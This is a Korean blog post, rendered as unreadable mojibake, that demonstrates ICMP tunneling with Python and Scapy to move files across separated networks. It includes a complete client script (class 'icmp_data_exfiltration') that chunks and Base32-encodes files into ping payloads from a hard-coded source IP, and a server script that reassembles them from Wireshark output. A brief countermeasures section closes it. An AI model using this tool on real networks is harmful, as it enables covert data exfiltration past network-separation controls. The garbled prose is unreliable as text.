---
title: ICMP Tunneling by Python with Scapy
date: 2022-11-08
author: glasses96
categories: [Network, ICMP]
tags: [ICMP Tunneling, scapy]
pin: true
math: true
mermaid: true
---

> **ICMP Tunnelingì„ í†µí•´ ë‚´ë¶€ë§ ê°„ ë°ì´í„°ë¥¼ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**  
> **ë‚´ë¶€ë§ ê°„ ping ëª…ë ¹ì–´ê°€ ë™ì‘ì„ í•˜ê²Œ ë  ê²½ìš° ICMP Tunnelingì„ ì´ìš©í•˜ì—¬ DATAë¥¼ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**
{: .prompt-info }

----
---

## What is ICMP?
ICMPì— ëŒ€í•˜ì—¬ ê°„ë‹¨í•˜ê²Œ ì•Œì•„ë³´ë©´ <span style="color:#9999FF"> ì¸í„°ë„· ì œì–´ ë©”ì‹œì§€ í”„ë¡œí† ì½œìœ¼ë¡œ ì¼ë°˜ì ìœ¼ë¡œ IP ë™ì‘ì—ì„œ ì§„ë‹¨ì´ë‚˜ ì œì–´ë¡œ ì‚¬ìš©ë˜ê±°ë‚˜ ì˜¤ë¥˜ì— ëŒ€í•œ ì‘ë‹µìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤. </span>

### ICMP êµ¬ì¡°
- ICMP Typeì´ ì¡´ì¬(Type 0 : Echo Reply, Type 8 : Echo Requestë“±)
- ICMPëŠ” MTUê°€ 1500Byteë¡œ 1500 Byteê°€ ë„˜ê²Œë˜ë©´ ë‹¨í¸í™”ê°€ ë°œìƒí•¨
- **ICMPì˜ Data ì˜ì—­ì— Dataë¥¼ ì§‘ì–´ ë„£ì–´ ë³´ë‚¼ ìˆ˜ ìˆìŒ**

![ICMP êµ¬ì¡°](/assets/post/4/1.png)

----
## Network êµ¬ì„±ë„
ë„¤íŠ¸ì›Œí¬ ì§€ì‹ì´ ë¶€ì¡±í•˜ì—¬..... ëŒ€ì¶© ë§Œë“  ë„¤íŠ¸ì›Œí¬ êµ¬ì„±ë„ ì…ë‹ˆë‹¤.
ì¼ë°˜ì ìœ¼ë¡œ íšŒì‚¬ì—ì„œ ë§(ë„¤íŠ¸ì›Œí¬)ì´ ë‹¤ë¥¸ PCë¼ë¦¬ ë°ì´í„°ë¥¼ ì£¼ê³  ë°›ê¸° ìœ„í•´ì„œëŠ” ë§ì—°ê³„ ì†”ë£¨ì…˜ì„ ì´ìš©í•©ë‹ˆë‹¤. ë§ì—°ê³„ ì†”ë£¨ì…˜ì„ í†µí•´ ë‚´ë¶€ë§ì˜ ì¤‘ìš”ìë£Œê°€ í•¨ë¶€ë¡œ ì¸í„°ë„·ë§ìœ¼ë¡œ ì „ë‹¬ ë˜ì§€ ì•Šê²Œ ë„ì™€ì¤ë‹ˆë‹¤.   
![ë„¤íŠ¸ì›Œí¬ êµ¬ì„±ë„](/assets/post/4/2.png)


---

## ICMP í„°ë„ë§ì„ í†µí•œ ë°ì´í„° ì „ì†¡
ì‚¬ì „ ì§€ì‹ì€ ì•Œì•˜ìœ¼ë‹ˆ ì‹¤ìŠµì„ í•´ë´…ì‹œë‹¤â—ï¸â—ï¸â—ï¸
ì‹¤ìŠµí•˜ê¸°ì— ì•ì„œ ì§‘ì—ì„œ ë§ë¶„ë¦¬ë¥¼ ë”°ë¡œ í•˜ì§€ ëª»í•´.... ë™ì¼ ë„¤íŠ¸ì›Œí¬ì— PC 2ëŒ€ë¡œ ì§„í–‰í–ˆìŠµë‹ˆë‹¤.

| PC | IP | ì„¤ëª… |
| :---: | :---: | :---: |
| Client PC | 192.168.0.2 |  ë°ì´í„°ë¥¼ ì „ë‹¬í•  PC |
| Server PC | 192.168.0.5 | ë°ì´í„°ë¥¼ ì „ë‹¬ë°›ì„ PC |

### Step 1. Client PC choose Data Files
ë¨¼ì € í´ë¼ì´ì–¸íŠ¸ PCì—ì„œ ì „ë‹¬í•  íŒŒì¼ë“¤ì„ ì„ íƒí•©ë‹ˆë‹¤.
.txt, .docx, .xlsx, .py íŒŒì¼ì„ ì••ì¶• ì‹œì¼œ í•˜ë‚˜ì˜ zip íŒŒì¼ë¡œ ë§Œë“¤ì—ˆê³  zip íŒŒì¼ì˜ í¬ê¸°ëŠ” ì•½ 20KB ì…ë‹ˆë‹¤.
ì•„ë˜ì˜ ì‚¬ì§„ì€ zip íŒŒì¼ì•ˆì— ìˆëŠ” ê°ê°ì˜ íŒŒì¼ ì…ë‹ˆë‹¤.
![Client ICMP](/assets/post/4/3.png)

### Step 2. Client PC send zip File
ë‹¤ìŒì€ zip íŒŒì¼ì„ Server PCë¡œ ICMPë¥¼ ì´ìš©í•´ ì „ë‹¬ í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.
pythonê³¼ scapy ëª¨ë“ˆì„ í†µí•´ ì œì‘í–ˆìœ¼ë©° ì œì‘ ë¡œì§ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.
>1. íŒŒì¼ì„ ë°”ì´ë„ˆë¦¬ë¡œ ì½ëŠ”ë‹¤.
2. Dataë¥¼ ì¸ì½”ë”©ì„ í•œë‹¤
-> Base32ë¡œ ì¸ì½”ë”© ì²˜ë¦¬ë¥¼ í•˜ì˜€ëŠ”ë° ì¸ì½”ë”©ì„ í•˜ì§€ ì•Šìœ¼ë©´ íŠ¹ì • íŒ¨í‚·ì´ ì „ì†¡ì´ ì•ˆë¬ìŠµë‹ˆë‹¤. ì´ìœ ëŠ” ì˜;;; OSë‹¨ì—ì„œ ì°¨ë‹¨í•˜ëŠ” ëŠë‚Œ
-> ì¸ì½”ë”© ë°ì´í„°ê°€ 1500 Byteê°€ ë„˜ì§€ì•Šë„ë¡ í•©ë‹ˆë‹¤. 1500Byteê°€ ë„˜ì–´ê°€ë©´ ë‹¨í¸í™”ê°€ ì¼ì–´ë‚˜ê¸° ë–„ë¬¸ì…ë‹ˆë‹¤.
3. ICMP í—¤ë”ì— Sequenceë¥¼ ì¶”ê°€í•©ë‹ˆë‹¤.
-> ì¶”í›„ Serverì—ì„œ ICMP ë©”ì‹œì§€ë¥¼ ì¡°ë¦½í•  ë•Œ ìˆœì„œì— ë§ì¶° ì¡°ë¦½í•´ì•¼ ë˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.
4. ICMP Send Message

Client.pyì„ ë§Œë“¤ì—ˆê³  ë§Œë“  í•¨ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. 
<span style="color:#9999FF"> 1. íŒŒì¼ì„ ë°”ì´ë„ˆë¦¬ë¡œ ì½ëŠ” í•¨ìˆ˜(Read_File) </span>
<span style="color:#9999FF"> 2. ì¸ì½”ë”© í•¨ìˆ˜(B32_Encoding)(Read_File) </span>
<span style="color:#9999FF"> 3. 1500Byteê°€ ë„˜ì§€ì•Šë„ë¡ ë°ì´í„°ë¥¼ ë§Œë“œëŠ” í•¨ìˆ˜(Send_Data) </span>
<span style="color:#9999FF"> 4. ë°ì´í„°ë¥¼ ë³´ë‚´ëŠ” í•¨ìˆ˜(Send_Ping) í•¨ìˆ˜ </span>

```python
#/usr/bin/python
import argparse
import os 
import time
import base64
from scapy.all import *

def DashBoard(url,file):
    screenDashboard = '''
    =====================================================
    ICMP SEND DATA
    =====================================================

    [-] Target IP : {0}
    [-] Load File : {1}
    '''.format(url,file)
    print(screenDashboard)


class colors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
        
        
class icmp_data_exfiltration(object):
    def __init__(self,target_host,send_file):
        self.target_host = target_host
        self.send_file = send_file
    
    def Read_File(self):
        with open(self.send_file,'rb') as f:
            Binary_DATA = f.read()
            return Binary_DATA
    
    def B32_Encoding(self,data):
        B32_DATA = base64.b32encode(data)
        return B32_DATA
    
    def Send_Data(self):
        Binary_DATA = self.Read_File()
        for i in range(0,int(len(Binary_DATA)/900)+1):
            print(colors.YELLOW+"[*] Send Ping to {0}".format(self.target_host+colors.RESET))
            SDATA= self.B32_Encoding(Binary_DATA[900*i:900*(i+1)])
            self.Send_Ping(SDATA,i)
        
    def Send_Ping(self,Send_DATA,Seq):
        ping = IP(src="192.168.0.5", dst=self.target_host, proto="icmp")/ICMP(seq=Seq)/(Send_DATA)
        send(ping)
            


if __name__ == "__main__":	        
    parser = argparse.ArgumentParser(description='Send IP, Send File')
    parser.add_argument('--dst-ip',required=True, help="destination IP")
    parser.add_argument('--file', required=True, help="Load File")
    args = parser.parse_args()
    
    DashBoard(args.dst_ip,args.file)
    ICMP_TEST = icmp_data_exfiltration(target_host=args.dst_ip,send_file=args.file)
    ICMP_TEST.Send_Data()
    print(colors.RED+"[*] Send Complete"+colors.RESET)
    
    # ì‚¬ìš©ë°©ë²• python3 scapy_client.py --dst-ip [íƒ€ì¼“ IP] --file [ì „ì†¡ íŒŒì¼]
```

### Step 3. Data Recieved Server PC
Server PCì—ì„œ Wiresharkë¥¼ ì¼œë†“ì•„ì„œ íŒ¨í‚·ì„ ë³´ê³  ìˆìœ¼ë©´ ICMP íŒ¨í‚·ì´ ì˜ ì˜¨ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•½20KB ë°ì´í„°ê°€ 24ê°œë¡œ ë‚˜ëˆ„ì–´ì ¸ ì˜¨ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
![Wireshark Packet](/assets/post/4/4.png)

### Step 4. Data Combination Server PC
Wiresharkì˜ ê¸°ëŠ¥ì¤‘ í•˜ë‚˜ì¸ JSON íŒŒì¼ë¡œ ì €ì¥í•˜ëŠ” ê¸°ëŠ¥ì„ ì´ìš©í•˜ì—¬ JSON íŒŒì¼ë¡œ ì €ì¥í•©ë‹ˆë‹¤.
ê·¸ ë’¤ JSON íŒŒì¼ì„ ê°€ê³µí•˜ì—¬ ì›ë˜ì˜ zipíŒŒì¼ë¡œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë¡œì§ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.
>1. ì €ì¥í•œ JSON íŒŒì¼ì„ ì½ì–´ ëª¨ë“  Sequnceê°€ ì˜ ë„ì°©í–ˆëŠ”ì§€ í™•ì¸í•œë‹¤.
2. ë§Œì•½ Loss Packetì´ ë°œìƒí•˜ë©´ Loss Packet Seqë§Œ ë‹¤ì‹œ ë³´ë‚¸ë‹¤
-> ì´ ë¶€ë¶„ì€ ìë™í™”ì— ì‹¤íŒ¨í•˜ì—¬.... ë”°ë¡œ Loss Packetì„ ë³´ë‚´ì£¼ëŠ” ì½”ë“œë¥¼ ë§Œë“¤ì—ˆìŠµë‹ˆë‹¤.
3. ë°ì´í„°ëŠ” ë°”ì´ë„ˆë¦¬ -> ì•Œë§ì€ í¬ê¸°ë¡œ ìë¥´ê¸° -> ì¸ì½”ë”© -> Seq ìˆœìœ¼ë¡œ ë§Œë“¤ì–´ì ¸ì„œ ë³´ë‚´ì¡Œê¸° ë•Œë¬¸ì— ì´ë¥¼ ì—­ìœ¼ë¡œ í•˜ëŠ” ì½”ë“œë¥¼ ë§Œë“¤ì—ˆìŠµë‹ˆë‹¤.

server.pyì„ ë§Œë“¤ì—ˆê³  ë§Œë“  í•¨ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. 
<span style="color:#9999FF"> `` 1. JSON íŒŒì¼ì„ ì½ì–´ Seqë¥¼ í™•ì¸ ë° í•„ìš”í•œ ë°ì´í„°ë§Œì„ ê°€ì ¸ì˜¤ëŠ” í•¨ìˆ˜(MergeData)``</span>
<span style="color:#9999FF"> `` 2. ë³µí˜¸í™” í•¨ìˆ˜(Decryption_DATA)``</span>

```python
import json
import argparse
import base64

class icmp_data_recevied(object):
    def __init__(self,input_file,output_file):
        self.input_file = input_file
        self.output_file = output_file

    def MergeData(self):
        encrypteddata =''
        Data_file = self.input_file
        with open(Data_file,encoding='UTF-8') as json_file:
            json_data = json.load(json_file)
            len_data = len(json_data)
            for i in range(0,len_data):
                sequence = json_data[i]["_source"]["layers"]["icmp"]["icmp.seq"]
                if(sequence == str(i)):
                    encrypteddata += json_data[i]["_source"]["layers"]["icmp"]["data"]["data.data"]
                elif(sequence != str(i)):
                    for j in range(0, len_data):
                        if(sequence == json_data[j]["_source"]["layers"]["icmp"]["icmp.seq"]):
                            encrypteddata += json_data[j]["_source"]["layers"]["icmp"]["data"]["data.data"]
                        else:
                            print("[*] " + str(i) +" Packet is not recevied!!!")
                            break
            return encrypteddata
        
    def Decryption_DATA(self):
        encrypteddata = self.MergeData()
        encrypteddata = encrypteddata.replace(":","")
        encrypteddata = bytes.fromhex(encrypteddata)
        print(len(encrypteddata))
        encrypteddata = base64.b32decode(encrypteddata)
        print(len(encrypteddata))
        
        
        file = open(args.output, 'wb')
        file.write(encrypteddata)
        file.close()

        print("[*] Successfully saved decrypted file!")





if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Send IP, Send File')
    parser.add_argument('--input',required=True, help="Input File")
    parser.add_argument('--output', required=True, help="Output File")
    args = parser.parse_args()
    
    ICMP_RECIEVE = icmp_data_recevied(args.input,args.output)
    ICMP_RECIEVE.Decryption_DATA()
    
    
    #ì‚¬ìš© ì˜ˆì‹œ python3 scapy_server.py --input [json] --output [file]
```

### Step 5. Result
ì„œë²„ PCì—ì„œ ì˜ í•©ì³ì„œ ë³µí˜¸í™”ëœ ëª¨ìŠµì…ë‹ˆë‹¤.
![Server ICMP](/assets/post/4/5.png)

---
## ë³´ì•ˆ ëŒ€ì±…
pingì„ ì°¨ë‹¨í•˜ëŠ” ë°©ë²•ì´ ì œì¼ ì¢‹ì€ ë°©ë²•ì…ë‹ˆë‹¤.
ë˜í•œ pingì„ ë³´ë‚´ë©´ 32byteë¥¼ ë³´ë‚´ê²Œ ë˜ëŠ”ë° ì´ë³´ë‹¤ ë§¤ìš° í° dataê°€ ì „ì†¡ë  ê²½ìš° + ë§ì€ icmpê°€ ìš”ì²­ë˜ëŠ” ê²½ìš°ë¥¼ ëª¨ë‹ˆí„°ë§ ë° ì°¨ë‹¨ í•˜ëŠ” ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤.

---

## í›„ê¸°
Server PCì—ì„œ ìë™ìœ¼ë¡œ ICMP íŒ¨í‚·ì„ í•©ì³ì£¼ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë§Œë“¤ë ¤ê³  í–ˆì§€ë§Œ... ì—¬ëŸ¬ê°€ì§€ ë³€ìˆ˜ê°€ ìˆì–´ ë§Œë“¤ì§€ë¥¼ ëª»í–ˆë‹¤. LOSS ë°œìƒ íŒ¨í‚·ê³¼ SEQ ëŒ€ë¡œ í•©ì³ì•¼ í•˜ëŠ”ë° ë„í†µ ìƒê°ì´ ì•ˆë‚œë‹¤.....
ì¢‹ì€ ìƒê°ì´ ìˆìœ¼ë©´ ëŒ“ê¸€ ë¶€íƒë“œë¦½ë‹ˆë‹¤ğŸ™ğŸ™ğŸ™ğŸ™ğŸ™ğŸ™